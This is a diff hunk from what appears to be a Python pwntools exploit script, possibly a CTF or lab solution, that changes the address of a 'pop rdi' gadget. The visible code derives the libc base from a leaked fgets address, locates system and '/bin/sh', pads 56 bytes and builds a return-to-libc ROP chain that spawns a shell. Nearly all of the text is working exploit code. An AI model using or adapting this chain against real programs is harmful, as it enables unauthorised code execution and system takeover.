@@ -13,7 +13,7 @@ libc.address = leak_fgets - libc.sym.fgets
 system = libc.sym.system
 binsh = next(libc.search(b"/bin/sh"))
 offset = 56
-pop_rdi = 0x000000000040120b
+pop_rdi = 0x0000000000401393
 
 junk = b'a'*offset
 rop_chain = p64(pop_rdi) + p64(binsh) + p64(system)
